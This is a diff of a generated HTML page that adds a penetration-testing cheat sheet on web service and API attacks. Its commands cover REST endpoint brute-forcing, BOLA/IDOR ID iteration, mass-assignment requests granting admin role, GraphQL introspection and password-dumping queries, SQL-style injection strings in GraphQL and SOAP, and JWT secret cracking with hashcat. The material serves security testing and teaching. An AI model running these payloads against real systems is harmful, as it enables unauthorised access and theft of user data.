@@ -165,7 +165,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#readme" class="md-skip">
+        <a href="#web-service-api-attacks" class="md-skip">
           Skip to content
         </a>
       
@@ -1415,6 +1415,24 @@
         
       
       
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web Service API
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
       <a href="./" class="md-nav__link md-nav__link--active">
         
   
@@ -1431,6 +1449,91 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#rest-api-recon" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        REST API Recon
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#bola-idor-in-apis" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        BOLA / IDOR in APIs
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#mass-assignment" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Mass Assignment
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#graphql" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        GraphQL
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#soap-wsdl" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SOAP (WSDL)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#jwt-testing" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        JWT Testing
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
       
     </li>
   
@@ -2841,6 +2944,80 @@
     
   
   
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#rest-api-recon" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        REST API Recon
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#bola-idor-in-apis" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        BOLA / IDOR in APIs
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#mass-assignment" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Mass Assignment
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#graphql" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        GraphQL
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#soap-wsdl" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SOAP (WSDL)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#jwt-testing" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        JWT Testing
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
 </nav>
                   </div>
                 </div>
@@ -2859,7 +3036,83 @@
   
 
 
-<h1 id="readme">README<a class="headerlink" href="#readme" title="Permanent link">&para;</a></h1>
+<h1 id="web-service-api-attacks">Web Service &amp; API Attacks<a class="headerlink" href="#web-service-api-attacks" title="Permanent link">&para;</a></h1>
+<p>Attacking REST APIs, SOAP services, and GraphQL endpoints — including mass assignment, BOLA, injection, and authentication flaws.</p>
+<h2 id="rest-api-recon">REST API Recon<a class="headerlink" href="#rest-api-recon" title="Permanent link">&para;</a></h2>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c1"># Common API paths</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>/api/v1/
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>/api/v2/
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>/swagger.json
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>/swagger-ui.html
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>/openapi.json
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>/api-docs
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>/.well-known/
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="c1"># Brute force API endpoints</span>
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>ffuf<span class="w"> </span>-u<span class="w"> </span>http://target.com/api/FUZZ<span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="c1"># Enumerate API methods</span>
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>curl<span class="w"> </span>-X<span class="w"> </span>OPTIONS<span class="w"> </span>http://target.com/api/users
+</span></code></pre></div>
+<h2 id="bola-idor-in-apis">BOLA / IDOR in APIs<a class="headerlink" href="#bola-idor-in-apis" title="Permanent link">&para;</a></h2>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c1"># Broken Object Level Authorization</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>GET<span class="w"> </span>/api/users/1/orders<span class="w">      </span>→<span class="w"> </span>change<span class="w"> </span><span class="m">1</span><span class="w"> </span>to<span class="w"> </span><span class="m">2</span>,3,...
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>GET<span class="w"> </span>/api/orders/ORDER-001<span class="w">    </span>→<span class="w"> </span>iterate<span class="w"> </span>order<span class="w"> </span>IDs
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="c1"># Check if authorization is enforced</span>
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>curl<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Authorization: Bearer victim_token&quot;</span><span class="w"> </span>http://target.com/api/users/2/data
+</span></code></pre></div>
+<h2 id="mass-assignment">Mass Assignment<a class="headerlink" href="#mass-assignment" title="Permanent link">&para;</a></h2>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c1"># Registration endpoint — add admin field</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://target.com/api/users/register<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/json&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;username&quot;:&quot;test&quot;,&quot;password&quot;:&quot;pass&quot;,&quot;role&quot;:&quot;admin&quot;,&quot;isVerified&quot;:true}&#39;</span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="c1"># Update endpoint</span>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>curl<span class="w"> </span>-X<span class="w"> </span>PUT<span class="w"> </span>http://target.com/api/users/1<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Authorization: Bearer token&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;name&quot;:&quot;test&quot;,&quot;balance&quot;:9999999}&#39;</span>
+</span></code></pre></div>
+<h2 id="graphql">GraphQL<a class="headerlink" href="#graphql" title="Permanent link">&para;</a></h2>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c1"># Introspection query — discover schema</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://target.com/graphql<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/json&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;query&quot;:&quot;{__schema{types{name fields{name}}}}&quot;}&#39;</span>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="c1"># Query all users</span>
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://target.com/graphql<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;query&quot;:&quot;{users{id username password email}}&quot;}&#39;</span>
+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>
+</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a><span class="c1"># GraphQL injection</span>
+</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a><span class="o">{</span><span class="s2">&quot;query&quot;</span>:<span class="s2">&quot;{user(id:\&quot;1 OR 1=1\&quot;){username}}&quot;</span><span class="o">}</span>
+</span></code></pre></div>
+<h2 id="soap-wsdl">SOAP (WSDL)<a class="headerlink" href="#soap-wsdl" title="Permanent link">&para;</a></h2>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c1"># Fetch WSDL</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>curl<span class="w"> </span><span class="s2">&quot;http://target.com/service?wsdl&quot;</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="c1"># Basic SOAP request</span>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://target.com/service<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: text/xml&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="s1">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span>
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="s1">  &lt;soapenv:Body&gt;</span>
+</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a><span class="s1">    &lt;GetUser&gt;&lt;id&gt;1&lt;/id&gt;&lt;/GetUser&gt;</span>
+</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a><span class="s1">  &lt;/soapenv:Body&gt;</span>
+</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a><span class="s1">&lt;/soapenv:Envelope&gt;&#39;</span>
+</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a>
+</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a><span class="c1"># SOAP injection</span>
+</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a>&lt;id&gt;1<span class="w"> </span>OR<span class="w"> </span><span class="nv">1</span><span class="o">=</span><span class="m">1</span>&lt;/id&gt;
+</span></code></pre></div>
+<h2 id="jwt-testing">JWT Testing<a class="headerlink" href="#jwt-testing" title="Permanent link">&para;</a></h2>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1"># Decode JWT (3 base64 parts separated by .)</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;eyJhbGciOiJIUzI1NiJ9&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="c1"># Test none algorithm</span>
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="c1"># Craft token with alg:none and no signature</span>
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="c1"># Brute force secret</span>
+</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>hashcat<span class="w"> </span>-a<span class="w"> </span><span class="m">0</span><span class="w"> </span>-m<span class="w"> </span><span class="m">16500</span><span class="w"> </span>token.txt<span class="w"> </span>rockyou.txt
+</span></code></pre></div>
 
 
 
